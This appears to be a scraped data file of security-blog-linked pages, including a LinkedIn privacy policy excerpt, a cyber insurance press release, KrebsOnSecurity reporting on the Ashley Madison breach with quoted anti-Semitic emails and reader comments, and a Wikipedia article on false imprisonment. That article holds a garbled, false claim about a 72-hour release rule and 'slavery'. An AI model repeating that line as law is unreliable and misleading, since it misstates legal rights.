(e.g., search engine results, mail and calendar applications that show a user limited profile data of the person they are meeting or messaging, social media aggregators, talent and lead managers). âOldâ profile information remains on these services until they update their data cache with changes you made to your profile. We share your data across our different Services and LinkedIn affiliated entities. We will share your personal data with our affiliates to provide and develop our Services. We may combine information internally across the different Services covered by this Privacy Policy to help our Services be more relevant and useful to you and others. For example, we may personalize your feed or job recommendations based on your learning history. We may use others to help us with our Services. We use others to help us provide our Services (e.g., maintenance, analysis, audit, payments, fraud detection, marketing and development). They will have access to your information as reasonably necessary to perform these tasks on our behalf and are obligated not to disclose or use it for other purposes. We may need to share your data when we believe itâs required by law or to help protect the rights and safety of you, us or others. It is possible that we will need to disclose information about you when required by law, subpoena, or other legal process or if we have a good faith belief that disclosure is reasonably necessary to (1) investigate, prevent or take action regarding suspected or actual illegal activities or to assist government enforcement agencies; (2) enforce our agreements with you; (3) investigate and defend ourselves against any third-party claims or allegations; (4) protect the security or integrity of our Services (such as by sharing with companies facing similar threats); or (5) exercise or protect the rights and safety of LinkedIn, our Members, personnel or others. We attempt to notify Members about legal demands for their personal data when appropriate in our judgment, unless prohibited by law or court order or when the request is an emergency. We may dispute such demands when we believe, in our discretion, that the requests are overbroad, vague or lack proper authority, but we do not promise to challenge every demand. To learn more see our Data Request Guidelines and Transparency Report. We may share your data when our business is sold to others, but it must continue to be used in accordance with this Privacy Policy. We can also share your personal data as part of a sale, merger or change in control, or in preparation for any of these events. Any other entity which buys us or part of our business will have the right to continue to use your data, but only in the manner set out in this Privacy Policy unless you agree otherwise. We keep most of your personal data for as long as your account is open. We generally retain your personal data as long as you keep your account open or as needed to provide you Services. This includes data you or others provided to us and data generated or inferred from your use of our Services. Even if you only use our Services when looking for a new job every few years, we will retain your information and keep your profile open, unless you close your account. In some cases we choose to retain certain information (e.g., insights about Services use) in a depersonalized or aggregated form. You can access or delete your personal data. You have many choices about how your data is collected, used and shared. We provide many choices about the collection, use and sharing of your data, from deleting or correcting data you include in your profile and controlling the visibility of your posts to advertising opt-outs and communication controls. We offer you settings to control and manage the personal data we have about you. For personal data that we have about you, you can: Visitors can learn more about how to make these requests here. You may also contact us using the contact information below, and we will consider your request in accordance with applicable laws. Residents in the Designated Countries and other regions may have additional rights under their laws. We keep some of your data even after you close your account. If you choose to close your Linkedin account, your personal data will generally stop being visible to others on our Services within 24 hours. We generally delete closed account information within 30 days of account closure, except as noted below. We retain your personal data even after you have closed your account if reasonably necessary to comply with our legal obligations (including law enforcement requests), meet regulatory requirements, resolve disputes, maintain security, prevent fraud and abuse (e.g., if we have restricted your account for breach of our Professional Community Policies), enforce our User Agreement, or fulfill your request to ""unsubscribe"" from further messages from us. We will retain de-personalized information after your account has been closed. Information you have shared with others (e.g., through InMail, updates or group posts) will remain visible after you close your account or delete the information from your own profile or mailbox, and we do not control data that other Members have copied out of our Services.

Webroot Blog,https://www.businesswire.com/news/home/20201030005321/en/20-Billion-Cyber-Insurance-Market---Global-Forecast-to-2025---ResearchAndMarkets.com,"DUBLIN--(BUSINESS WIRE)--The ""Cyber Insurance Market by Component (Solutions (Analytics & Cybersecurity) and Services), Type (Standalone & Packaged), Coverage (Data Breach & Cyber Liability), Organization Size, End User (Technology & Insurance), and Region - Global Forecast to 2025"" report has been added to ResearchAndMarkets.com's offering.
  
The global cyber insurance market size in the post-COVID-19 scenario is projected to grow from USD 7.8 billion in 2020 to USD 20.4 billion by 2025, at a CAGR of 21.2% during the forecast period.
 
The market study covers the cyber insurance market size across different segments. It aims at estimating the market size and the growth potential across different segments, including application, service model, security type, organization size, vertical, and region. The study further includes an in-depth competitive analysis of the leading market players, along with their company profiles, key observations related to product and business offerings, recent developments, and market strategies.
 
The major factors driving the market include the increasing number of security breaches and cyberattacks resulting in huge financial losses and stringent government regulations towards the adoption of cyber insurance policies.
 
By insurance coverage, the cyber liability segment expected to hold a larger market size in 2025
 
Cyber risk insurance or cyber liability insurance coverage helps an organization cover the cost to recover from a data breach, virus, or other cyber-attacks. Cyber liability insurance covers expenses related to first parties and also third-party claims. The cyber insurance policy covers some reimbursable expenses such as investigation, business losses, lawsuits and extortion, and privacy and notification.
 
The growing sophistication of cyber-attacks and stringent regulatory mandates persuade enterprises to proactively adopt cyber insurance solutions. Cyber liability coverage policies can assist insurers to offer first party and third part cyber coverage to prevent the post effects of a security breach that could result in critical business losses.
 
Key vendors offering various types of cyber insurance solutions include Allianz Group, AIG, Chubb, Aon, Zurich, AXA, and Berkshire Hathaway, among others
 
APAC to register the highest growth rate during the forecast period
 
Asia Pacific (APAC) comprises of emerging economies, such as Australia and New Zealand, China, Singapore, and Japan, with developed security infrastructure. Machine Learning (ML), Internet of Things (IoT), big data analytics, and Artificial Intelligence (AI) are emerging methodologies that are being deployed in this region. APAC is home to large number of established Small and Medium-sized Enterprises (SMEs), which are growing at a laudable pace to cater to their large customer base.
 
SMEs are rapidly adopting cyber insurance solutions to manage their enterprise data. Despite the growing importance of SMEs in this region, they are most affected mostly by cyber and malware attacks owing to budgetary constraints and resource shortages.

Hexacorn Blog,https://lolol.farm/, A great collection of resources to thrive off the land
Hexacorn Blog,https://www.hexacorn.com/blog/2023/06/22/the-myth-of-knowing-your-org-know_your_org-docx/,"The cyber consulting world delivers a lot of useful security work. They do workshops, trainings, table top exercises, they write playbooks, red team, provide assessments, and help companies with gap analysis, system configuration and hardening.  Many of these engagements often start with some sort of a questionnaire. The customer is asked about scope of engagement, network architecture, Active Directory configuration, list of crown jewels, number of endpoints, OS/platform coverage, cloud setup, containers usage, *aaS, security controls, software, etc. The answers help consultants to tweak their deliverables to customers’ needs. They assume, rightfully so, that when they are being engaged and paid big bucks for their work, they will work with the company’s senior managements, architects, and SMEs. The company’s best. Sometimes it is the case. Most of the time though, there is a chaos on the other side of the fence.  I am definitely biased, but I have seen enough consulting engagements bought on a whim to conclude that many decision makers should not be responsible for spending these budgets :-). Yes, sadly, many ‘cyber leaders’ find themselves in a situation where either they need to quickly demonstrate that they are doing something useful (and hiring a consulting company is an easy OKR!), or they simply have a budget that needs to be spent. Budget either inherited from the previous leadership, or won after long battles – an asset that one cannot and should not let go. Because if you don’t spend all the money in your budget, next year you will see cuts. Not cool.  It may look like a vicious cycle, but doesn’t have to be. There is a value in these consulting gigs, but some planning needs to be done first. The number one is… documentation about your org. If you don’t have a short document that covers (on a high-level) what your company looks like from a perspective of IT/cyber, you may want to write one. This is a perfect document to share with the consulting firm when they send you their questionnaire.  The document should include: Building such document is NOT easy. It’s a gargantuan task that needs to be sponsored from a CISO level. And this is why Threat Intel should build it.  They are in the best position to write it and own it, because in the course of doing so, they will get to ‘know the org’. They have a vested interest in knowing all the possible company assets and their value. They will meet CISO, Senior Management, various teams, engineers, SMEs, Project Managers, Vulnerability Managers, SOC, etc.. They wil build important relationships. They will leverage existing asset inventories, and validate them with Threat Hunters. They will use all this data to cross-reference information from many different sources. And once they create document like this, they will be best positioned to contextualize intel gathered from TI vendors, social media, peers. The way many TI teams are set up today is a set up destined to fail.  So, back to the consulting gigs… If you plan to engage consultants, make your TI team build a ‘know your org.docx’  first, then work with them on how best to spend this extra dollar…  "
TaoSecurity Blog,https://taosecurity.blogspot.com/2022/08/the-humble-hub.html,"
Richard Bejtlich's blog on digital security, strategic thought, and military history.
   Over the weekend I organized some old computing equipment. I found this beauty in one of my boxes. It's a Netgear EN104TP hub. I've mentioned this device before, in this blog and my books. This sort of device was the last of the true hubs. In an age where cables seem reserved for data centers or industrial facilities, and wireless rules the home and office, this hub is a relic of days gone past. To give you a sense of how old this device is, the Netgear documentation (still online -- well done) offers a PDF created in August 1998. (Again, well done Netgear, not mucking about with the timestamps.) I'm not sure how old my specific device is. Seeing as I started working in the AFCERT in the fall of 1998, I could see this hub being easily over 20 years old.  A hub is a network device that accepts traffic from its ports and repeats the traffic to all other ports. This is different from a switch, which maintains a table identifying which MAC addresses are in use on which ports. Before building this CAM (content addressable memory, IIRC) table, traffic to a new previously unforeseen MAC address will appear on all ports save the sender. This is a ""true hub"" because all of the ports are 10 Mbps. Yes, that is 100 times ""slower"" than the Gigabit ports on modern devices, if they have Ethernet ports at all. Starting with 10/100 Mbps devices, they all became switches. I never encountered a 100 Mbps ""hub."" Every device I ever had hands on was a 10/100 Mbps switch. That meant you were unlikely to see traffic on all ports when using a 10/100 Mbps device or even a 100 Mbps device (which I never saw anyway). There were no Gigabit (1000 Mbps) hubs built. I don't think the specification even supports it. These little boxes were network monitoring enablers. If you wanted to learn, or troubleshoot, or possibly even add monitoring to a production network, you could connect an upstream cable, a downstream cable, and a monitoring cable to the hub. The upstream could be a router and the downstream might be a firewall, and the monitoring would be your NSM server. If you were looking at traffic between two individual computers and needed visibility for a NSM laptop, you would plug all three into the hub, and plug your Internet upstream into the fourth port. I haven't needed this device in years, but I plan to keep it as a physical artifact of a time long past. At least this one still powers on, unlike my first computer, a Timex Sinclair ZX-80."
KrebsOnSecurity,https://krebsonsecurity.com/2023/07/top-suspect-in-2015-ashley-madison-hack-committed-suicide-in-2014/,"When the marital infidelity website AshleyMadison.com learned in July 2015 that hackers were threatening to publish data stolen from 37 million users, the company’s then-CEO Noel Biderman was quick to point the finger at an unnamed former contractor. But as a new documentary series on Hulu reveals [SPOILER ALERT!], there was just one problem with that theory: Their top suspect had killed himself more than a year before the hackers began publishing stolen user data. The new documentary, The Ashley Madison Affair, begins airing today on Hulu in the United States and on Disney+ in the United Kingdom. The series features interviews with security experts and journalists, Ashley Madison executives, victims of the breach and jilted spouses.  The series also touches on shocking new details unearthed by KrebsOnSecurity and Jeremy Bullock, a data scientist who worked with the show’s producers at the Warner Bros. production company Wall to Wall Media. Bullock had spent many hours poring over the hundreds of thousands of emails that the Ashley Madison hackers stole from Biderman and published online in 2015. Wall to Wall reached out in July 2022 about collaborating with Bullock after KrebsOnSecurity published A Retrospective on the 2015 Ashley Madison Breach. That piece explored how Biderman — who is Jewish — had become the target of concerted harassment campaigns by anti-Semitic and far-right groups online in the months leading up to the hack. Whoever hacked Ashley Madison had access to all employee emails, but they only released Biderman’s messages — three years worth. Apropos of my retrospective report, Bullock found that a great many messages in Biderman’s inbox were belligerent and anti-Semitic screeds from a former Ashley Madison employee named William Brewster Harrison. William Harrison’s employment contract with Ashley Madison parent Avid Life Media. The messages show that Harrison was hired in March 2010 to help promote Ashley Madison online, but the messages also reveal Harrison was heavily involved in helping to create and cultivate phony female accounts on the service. There is evidence to suggest that in 2010 Harrison was directed to harass the owner of Ashleymadisonsucks.com into closing the site or selling the domain to Ashley Madison. Ashley Madison’s parent company — Toronto-based Avid Life Media — filed a trademark infringement complaint in 2010 that succeeded in revealing a man named Dennis Bradshaw as the owner. But after being informed that Bradshaw was not subject to Canadian trademark laws, Avid Life offered to buy AshleyMadisonSucks.com for $10,000. When Bradshaw refused to sell the domain, he and his then-girlfriend were subject to an unrelenting campaign of online harassment and blackmail. It now appears those attacks were perpetrated by Harrison, who sent emails from different accounts at the free email service Vistomail pretending to be Bradshaw, his then-girlfriend and their friends. [As the documentary points out, the domain AshleyMadisonSucks.com was eventually transferred to Ashley Madison, which then shrewdly used it for advertising and to help debunk theories about why its service was supposedly untrustworthy]. Harrison even went after Bradshaw’s lawyer and wife, listing them both on a website he created called Contact-a-CEO[.]com, which Harrison used to besmirch the name of major companies — including several past employers — all entities he believed had slighted him or his family in some way. The site also claimed to include the names, addresses and phone numbers of top CEOs. A cached copy of Harrison’s website, contact-the-ceo.com. An exhaustive analysis of domains registered to the various Vistomail pseudonyms used by Harrison shows he also ran Bash-a-Business[.]com, which Harrison dedicated to “all those sorry ass corporate executives out there profiting from your hard work, organs, lives, ideas, intelligence, and wallets.” Copies of the site at archive.org show it was the work of someone calling themselves “The Chaos Creator.” Will Harrison was terminated as an Ashley Madison employee in November 2011, and by early 2012 he’d turned his considerable harassment skills squarely against the company. Ashley Madison’s long-suspected army of fake female accounts came to the fore in August 2012 after the former sex worker turned activist and blogger Maggie McNeill published screenshots apparently taken from Ashley Madison’s internal systems suggesting that a large percentage of the female accounts on the service were computer-operated bots. Ashley Madison’s executives understood that only a handful of employees at the time would have had access to the systems needed to produce the screenshots McNeill published online. In one exchange on Aug. 16, 2012, Ashley Madison’s director of IT was asked to produce a list of all company employees with all-powerful administrator access. “Who or what is asdfdfsda@asdf.com?,” Biderman asked, after being sent a list of nine email addresses. “It appears to be the email address Will used for his profiles,” the IT director replied. “And his access was never shut off until today?,” asked the company’s general counsel Mike Dacks. A Biderman email from 2012. What prompted the data scientist Bullock to reach out were gobs of anti-Semitic diatribes from Harrison, who had taken to labeling Biderman and others “greedy Jew bastards.” “So good luck, I’m sure we’ll talk again soon, but for now, Ive got better things in the oven,” Harrison wrote to Biderman after his employment contract with Ashley Madison was terminated. “Just remember I outsmarted you last time and I will outsmart and out maneuver you this time too, by keeping myself far far away from the action and just enjoying the sideline view, cheering for the opposition.” A 2012 email from William Harrison to former Ashley Madison CEO Noel Biderman. Harrison signed his threatening missive with the salutation, “We are legion,” suggesting that whatever comeuppance he had in store for Ashley Madison would come from a variety of directions and anonymous hackers. The leaked Biderman emails show that Harrison made good on his threats, and that in the months that followed Harrison began targeting Biderman and other Ashley Madison executives with menacing anonymous emails and spoofed phone calls laced with profanity and anti-Semitic language. But on Mar. 5, 2014, Harrison committed suicide by shooting himself in the head with a handgun. This fact was apparently unknown to Biderman and other Ashley Madison executives more than a year later when their July 2015 hack was first revealed. Does Harrison’s untimely suicide rule him out as a suspect in the 2015 hack? Who is The Chaos Creator, and what else transpired between Harrison and Ashley Madison prior to his death? We’ll explore these questions in Part II of this story, to be published early next week. _x000D_

          Nice cliff hanger, Brian. Got me on the edge of my seat. ð Yeah now I HAVE to come back. This is retarded What an interesting read. Harrison was definitely nuts, and I am curious to know more of his (wrong)doings. As far as “wrongs” go I think in publishing a privileged list of shady sexbots deliberately ignored by management of a shady sex (bot) company that purpots to represent themselves as a “legitimate” shady sex company… it’s all pretty shady. Waoh, can’t wait for the rest of the article, it’s so interesting, the final point must be insane for you guys to make it into a series !! Then Jesus asked him, âWhat is your name?â âMy name is Legion,â he replied, âfor we are many.â Waoh, can’t wait for the rest of the article, it’s so interesting, the final point must be insane for you guys to make it into a series !! Man Iâm excited!!! First day here by way of this Ashley Madison doc(& had never heard of anything about it, thought it was a ywf). I canât wait for part II & all the other interesting reads! Thanks for your years of great work! “victims” of the breach and jilted spouses. The only victims were the spouses.   Justice was done. Not entirely true. Ashley Madison never bothered to verify email addresses before signing up an account, which means anyone could have signed up anyone else’s email for the service. Also, some people registered just to see if their significant other was cheating, or to see what all the fuss was about. And it looks like a lot of the men who registered hoping to chat w/ horny housewives were really just chatting w/ bots. But all of those groups of users found themselves the subject of the same extortion attacks after their data was leaked. But after emails associated with AM were already leaked, what would be the further ransom object if “they” weren’t “actually” using the service in a provable way?  Knowing “AM never bothered to verify email addresses before signing up an account” would be nigh enough to casually absolve anything except some futher attributable direct PII or juicy details, right?  I suppose most people wouldn’t already know AM didn’t verify emails, but it’s also an easy defense that could itself be verified.  What would be the difference vs just harvesting emails generally (or targetedly…) and pseudo-subscribing them to embarassing groups/mailing lists to a similar extortable effect, assuming they weren’t themselves actually chatting with sexbots and giving out PII in the process?  Not to defend extortion obviously, just trying to understand the “innocents” angle. Everyone in my fraternity had accounts on there at one point. We had a pledge class that signed everyone up using their Facebook pictures and the frat info resources as a prank. You really think that the guys that got married aren’t even slightly susceptible to a ransom 10 years later when they find out that the info used was correct and they’ve been married for 5 years now? Yep. The lack of validation sucks. Fwiw, I actually visited their offices to demand they remove my email address as I had never signed up and they didn’t validate it. That clearly didn’t work as evidenced by the leaks. Big yawn Sounds like a cool dude. Pity he was murdered. The truth  is out there ! “who paid Krebs for this article for $100 Alex” said anyone with a braincell… Spam i looked at leaked databases when it happened, i saw a lot of names of people I know, and quit looking for 3 reasons:
1. I don’t want to know
2. People’s sex lives should be private
3. Nothing could be verified, you never know who signed up as who or for what Man, 8 years after the hack and we are STILL getting plot twists in this story. I remember being a teenager browsing 9gag and seeing memes on this, thinking that it would be forgotten in like 2 weeks. Insane stuff. The situation of the released emails not being verified reminds me of a passage in Isaiah.
9 Therefore justice is far from us,
and righteousness does not overtake us;
  we hope for light, and behold, darkness,
and for brightness, but we walk in gloom.
 10Â  We grope for the wall like the blind;
we grope like those who have no eyes;
  we stumble at noon as in the twilight,
among those in full vigor we are like dead men.
 11Â  We all growl like bears;
we moan and moan like doves;
  we hope for justice, but there is none;
for salvation, but it is far from us.
 12Â  For our transgressions are multiplied before you,
and our sins testify against us;
  for our transgressions are with us,
and we know our iniquities:
 13Â  transgressing, and denying the Lord,
and turning back from following our God,
  speaking oppression and revolt,
conceiving and uttering from the heart lying words.
-Isaiah 59:9â13. interesting…. Great reporting Brian.
1. Right off the top, the level of vitriol against KrebsOnSecurity is ridiculous.  This just in: an investigative journalist who focuses on cyber security publishes stories on hacking episodes.  Some of you player haters seem to have not-grasped this concept.
2. Obvious question you are probably going to answer is: did timestamps on any hack data originate after Harrison’s death? If not, then Harrison could have disseminated or time-delayed a push of hack data.
3. Was there even a criminal investigation done into the death of Harrison and if so, did the investigators realize what a wealthy enemy he had in Biderman? If not, authorities could have easily misclassified Harrison’s cause of death. Comments are closed. Mailing List Search KrebsOnSecurity Recent Posts Spam Nation A New York Times Bestseller!

KrebsOnSecurity,https://krebsonsecurity.com/2015/07/online-cheating-site-ashleymadison-hacked/,"Large caches of data stolen from online cheating site AshleyMadison.com have been posted online by an individual or group that claims to have completely compromised the company’s user databases, financial records and other proprietary information. The still-unfolding leak could be quite damaging to some 37 million users of the hookup service, whose slogan is “Life is short. Have an affair.”  The data released by the hacker or hackers — which self-identify asÂ The Impact Team — includes sensitive internal data stolen from Avid Life MediaÂ (ALM), the Toronto-based firm that owns AshleyMadison as well as related hookup sitesÂ Cougar Life and Established Men. Reached by KrebsOnSecurity late Sunday evening, ALM Chief Executive Noel Biderman confirmed the hack, and said the company was “working diligently and feverishly” to take down ALM’s intellectual property. Indeed, in the short span of 30 minutes between that brief interview and the publication of this story, several of the Impact Team’s Web links were no longer responding. “We’re not denying this happened,” Biderman said. “Like us or not, this is still a criminal act.” Besides snippets of account data apparently sampled at random from amongÂ some 40Â million users across ALM’s trio of properties, the hackers leaked maps of internal company servers, employee network account information, company bank account data and salary information. The compromiseÂ comes less than twoÂ months after intruders stole and leaked online user data on millions of accounts from hookup site AdultFriendFinder. In a long manifesto posted alongside the stolen ALM data, The Impact Team said it decided to publish the information in response toÂ alleged lies ALM told its customers about a service that allows members to completely erase their profile information for a $19 fee. According to the hackers, although the “full delete” feature that Ashley Madison advertises promises “removal of site usage history and personally identifiable information from the site,” users’ purchase details — including real name and address — aren’t actually scrubbed. “Full Delete netted ALM $1.7mm in revenue in 2014. It’s also a complete lie,” the hacking group wrote. “Users almost always pay with credit card; their purchase details are not removed as promised, and include real name and address, which is of course the most important information the users want removed.” Their demands continue: “Avid Life Media has been instructed to take Ashley Madison and Established Men offline permanently in all forms, or we will release all customer records, including profiles with all the customers’ secret sexual fantasies and matching credit card transactions, real names and addresses, and employee documents and emails. The other websites may stay online.” A snippet of the message left behind by the Impact Team. It’s unclear how much of the AshleyMadison user account data has been posted online. For now, it appears the hackers have published a relatively small percentageÂ of AshleyMadison user account data and are planning to publish more for each day the company stays online. “Too bad for those men, they’re cheating dirtbags and deserve no such discretion,” the hackers continued. “Too bad for ALM, you promised secrecy but didn’t deliver. We’ve got the complete set of profiles in our DB dumps, and we’ll release them soon if Ashley Madison stays online. And with over 37 million members, mostly from the US and Canada, a significant percentage of the population is about to have a very bad day, including many rich and powerful people.” ALM CEO Biderman declined to discuss specifics of the company’s investigation, which he characterized as ongoing and fast-moving. But he did suggest that the incident may have been the work of someone who at least at one time had legitimate, inside access to the company’s networks — perhaps a former employee or contractor. “We’re on the doorstep of [confirming]Â whoÂ we believe is the culprit, and unfortunately that may have triggered this mass publication,” Biderman said. “I’ve got their profile right in front of me, all their work credentials. It was definitely a person here that was not an employee but certainly had touched our technical services.” As if to support this theory, the message left behind by the attackers gives something of a shout out to ALM’s director of security. “Our one apology is to Mark Steele (Director of Security),” the manifesto reads. “You did everything you could, but nothing you could have done could have stopped this.” Several of the leaked internal documents indicate ALM was hyper aware of the risks of a data breach. In a Microsoft Excel document that apparently served as a questionnaire for employees about challenges and risks facing the company, employees wereÂ asked “In what area would you hate to see something go wrong?” Trevor Stokes, ALM’s chief technology officer, put his worst fears on the table: “Security,” he wrote. “I would hate to see our systems hacked and/or the leak of personal information.” In the wake of the AdultFriendFinder breach, many wondered whether AshleyMadison would be next. As the Wall Street Journal noted in a May 2015 brief titled “Risky Business for AshleyMadison.com,” the company had voicedÂ plans for an initial public offeringÂ in London later this year with the hope of raising as much as $200 million. “Given the breach at AdultFriendFinder, investors will have to think of hack attacks as a risk factor,” the WSJ wrote. “And given its businessâs reliance on confidentiality, prospective AshleyMadison investors should hope it has sufficiently, er, girded its loins.” Update, 8:58 a.m. ET:Â ALM has released the following statement about this attack: “We were recently made aware of an attempt by an unauthorized party to gain access to our systems. We immediately launched a thorough investigation utilizing leading forensics experts and other security professionals to determine the origin, nature, and scope of this incident.” “We apologize for this unprovoked and criminal intrusion into our customersâ information. The current business world has proven to be one in which no companyâs online assets are safe from cyber-vandalism, with Avid Life Media being only the latest among many companies to have been attacked, despite investing in the latest privacy and security technologies.” “We have always had the confidentiality of our customersâ information foremost in our minds, and have had stringent security measures in place, including working with leading IT vendors from around the world. As other companies have experienced, these security measures have unfortunately not prevented this attack to our system.” “At this time, we have been able to secure our sites, and close the unauthorized access points. We are working with law enforcement agencies, which are investigating this criminal act. Any and all parties responsible for this act of cyberâterrorism will be held responsible.” “Avid Life Media has the utmost confidence in its business, and with the support of leading experts in IT security, including Joel Eriksson, CTO, Cycura, we will continue to be a leader in the services we provide. âI have worked with leading companies around the world to secure their businesses. I have no doubt, based on the work I and my company are doing, Avid Life Media will continue to be a strong, secure business,â Eriksson said.” _x000D_

          OK Ashley Madison, I get that this is a crime and should be treated as such. I will forget that this ever happened – essentially delete it from my mind. But for a $20 premium you can access my FullDelete(TM) Feature and I will forget absolutely everything about you and your services. I promise.

KrebsOnSecurity,https://web.archive.org/web/20100623223703/http://www.marriage-playground.com:80/,"My name is Ashley and I am 38 years old. I met my husband in High School in Los Angeles and got married immediately following before we both headed off to different colleges in California.  Getting into a serious relationship early into adulthood can be a trying. At 16 years old, we met our Sophomore year in Science class. We noticed each other looking at each other and smiling, and then proceed to introduce ourselves through passing notes, how childish right?  In the early stages of any relationship, the male courter will typically do all kinds of flattering and enjoyable things to get and keep the attention of the female. It starts with many smiles, and eventually leads to him asking her for a first date. The first date is usually where the female decides if he is worthy of a second date. We both received our college degrees on schedule and were both able to find local jobs immediately following graduation. Pregnancy and parenting were the last things on our minds. We understood that before we brought a child into this world, we were going to have to be able to afford taking care of ourselves. Between the college loans and monthly expenses, we certainly had our work cut out for us if we were going to be able to afford to start a family someday soon. My parent has just finished letting go of me, the last thing we needed to do was have to take care of a baby! I even saw a commercial on television one day that stated it cost nearly a quarter million dollars to raise a single child.  We got engaged about 6 months after we finished college and obtained our bachelor degrees. He got his degree in Computer Science and I got mine in Psychology. While planning for the wedding of my dreams, I never realized how much needed to go into coordinating a wedding. The wedding dress is usually the first thing that a bride picks out. The DJ, and wedding cake, and caterer are all secondary to the wedding dress choice. It is amazing that there are endless choices for a dress that is worn once during your lifetime, and if you are lucky maybe another time or two when renewing vows throughout the marriage. Please be patient as I develop this website and probably add a blog at some point!"
KrebsOnSecurity,https://en.wikipedia.org/wiki/False_imprisonment,"
 False imprisonment or unlawful imprisonment occurs when a person intentionally restricts another person's movement within any area without legal authority, justification, or the restrained person's permission.[1] Actual physical restraint is not necessary for false imprisonment to occur. A false imprisonment claim may be made based upon private acts, or upon wrongful governmental detention. For detention by the police, proof of false imprisonment provides a basis to obtain a writ of habeas corpus.[2]
 Under common law, false imprisonment is both a crime and a tort.
 Within the context of false imprisonment, an imprisonment occurs when a person is restrained from moving from a location or bounded area, as a result of a wrongful intentional act, such as the use of force, threat, coercion, or abuse of authority.[1]
 Not all acts of involuntary detention amount to false imprisonment.  An accidental detention will not support a claim of false imprisonment since false imprisonment requires an intentional act. The law may privilege a person to detain somebody else against their will. A legally authorised detention does not constitute false imprisonment. For example, if a parent or legal guardian of a child denies the child's request to leave their house, and prevents them from doing so, this would not ordinarily constitute false imprisonment.
 Under United States law, police officers have the right to detain individuals based on probable cause that a crime has been committed and the individual was involved, or based on reasonable suspicion that the individual has been, is, or is about to be engaged in a criminal activity.
 To prevail under a false imprisonment claim, a plaintiff must prove:
 loss of probable cause When the probable cause of the suspect in a crime, they nolonger has just cause to hold the suspect, and the suspect musts be released within 72 hours. Beyond this point, it is false arrest, false imprisonment, human trafficking and unconstitutional slavery.
 Many jurisdictions in the United States recognize the common law known as shopkeeper's privilege under which a person is allowed to detain a suspected shoplifter on store property for a reasonable period of time. The shopkeeper has cause to believe that the detainee in fact committed, or attempted to commit, theft of store property. The shopkeeper is allowed to ask the suspect to demonstrate that they have not been shoplifting. The purpose of the shopkeeper's privilege is to discover if the suspect is shoplifting and, if so, whether the shoplifted item can be reclaimed.[3]
 The shopkeeper's privilege, although recognized in most jurisdictions, is not as broad a privilege as that of a police officer's. Therefore, one must pay special attention to the temporal element: the shopkeeper may only detain the suspected criminal for a relatively short period of time. This is similar to a general right in many jurisdictions, and in limited circumstances, of citizen's arrest of suspected criminals by private citizens. In those jurisdictions, if someone detains an innocent person or unreasonably detains the suspect, uses excessive force to detain the suspect, or fails to notify the police within a reasonable time after detaining the suspect, then the detention may constitute false imprisonment and can result in an award of damages for the illegal detention. In jurisdictions without the privilege, detaining someone may constitute false imprisonment, even if the suspect is detained for doing something illegal without using excessive force and doing something illegal in the process, and the police gets notified within a reasonable time after the suspect is detained.
 This privilege has been justified by the very practical need for some degree of protection for shopkeepers in their dealings with suspected shoplifters. Absent such privilege, a shopkeeper would be faced with the dilemma of either allowing suspects to leave without challenge or acting upon their suspicion and risk making a false arrest.[4]
 In order for a customer to be detained, the shopkeeper must:[5]
 In Enright v. Groves, a woman sued a police officer for false imprisonment after being arrested for not producing her driver's license. The plaintiff was in her car when she was approached by the officer for not leashing her dog; she was arrested after being asked to produce her driver's license and failing to do so.  She won her claim, despite having lost the case of not leashing her dog.  The court reasoned that the officer did not have proper legal authority in arresting her, because he arrested her for not producing her driver's license (which itself was legal) as opposed to the dog leash violation.[6]
 In a Clark County, Indiana Circuit Court case, Destiny Hoffman was jailed for 154 days, during which ""no hearing was conducted to determine the validity of such sanction and the defendant was not represented by counsel"" according to deputy county prosecutor Michaelia Gilbert.[7] An order by Judge Jerry Jacobi[8] in the Clark County Circuit Court case was supposed to be a 48-hour jail stay for Hoffman, pending drug evaluation and treatment, ""until further order of the court.""[7] After a motion by Prosecutor Gilbert, Special Judge Steve Fleece ordered Hoffman released and said Hoffman's incarceration was ""a big screw up"".[8]
 In a Louisiana case in the United States, a pharmacist and his pharmacy were found liable by a trial court for false imprisonment. They stalled for time and instructed a patient to wait while simultaneously and without the patient's knowledge calling the police. The pharmacist was suspicious of the patient's prescription, which her doctor had called in previously. When the police arrived, they arrested the patient.  While the patient was in jail, the police verified with her doctor that the prescription was authentic and that it was meant for her.  After this incident, the patient sued the pharmacy and its employees. She received $20,000 damages. An appeals court reversed the judgment, because it believed the elements of false imprisonment were not met.[9][10]
 This tort again falls under the umbrella term ""trespass to the person"" alongside ""battery and assault"".[11] The definition of false imprisonment under UK law and legislation is the ""Unlawful imposition or constraint of another's freedom of movement from a particular place.""[12] False imprisonment is where the defendant intentionally or recklessly, and unlawfully, restricts the claimant's freedom of movement totally.[13] During which there is no time limit, false imprisonment could occur for seconds and still be false imprisonment.
 Any restraint of the liberty of a free man will be an imprisonment. An example of reckless imprisonment may be a janitor locking up a school for the night, knowing that someone might still be inside, but without bothering to check. Whereas, regarding intention, intention to imprison a person is what matters and not necessarily an intention to falsely imprison someone. For example, in R v Governor of Brockhill Prison, ex p Evans,[15] it did not matter if the decision to imprison the claimant was in good faith, or considered lawful, it still constituted false imprisonment.
 False imprisonment does not require a literal prison, but a restriction of the claimant's freedom of movement (complete restraint). According to the Termes de la Ley, 'imprisonment is the restraint of a man's liberty, whether it be in the open field, or in the stocks, or in the cage in the streets or in a man's own house, as well as in the common gaole'. Imprisonment does not have to involve seizure of the claimant; touching and informing him that he is under arrest are sufficient.[16] Tagging and an imposed curfew can be false imprisonment.[17][18] The restriction must also be total, meaning that the claimant is restricted to an area delimited by the defendant. The larger the area, the less likely the claimant will be deemed to be imprisoned. For example, confining a person to a house would constitute the tort of false imprisonment. However, confining someone to the land mass of the USA would not.
 Therefore, false imprisonment is not just about locking someone within a room, the following examples have all been found to constitute false imprisonment:
 Finally, where a claimant accedes to authority that does not necessarily mean they consent to being detained, as in Warner v Riddiford (1858).[23]
 'Imprisonment is, as I apprehend, a total restraint of the liberty of the person, for however, short a time, and not a partial obstruction of his will, whatever inconvenience it may bring on him.'[24] There must be complete restraint, therefore, if there are alternative routes that can be taken this is not false imprisonment. Such as in Bird v Jones [1845][14] where the claimant wanted to walk over Hammersmith bridge but the defendant had cordoned off the public footpath, however, this did not constitute false imprisonment because, through using a longer route, the claimant could have still reached their destination.
 Therefore, if there is a means of escape, this is not false imprisonment. There must be no reasonable means of escape and you may be compensated for any damages caused in order for you to escape reasonably.  However, if you have not taken a reasonable route of escape/reasonable action you will not be awarded damages.[25]
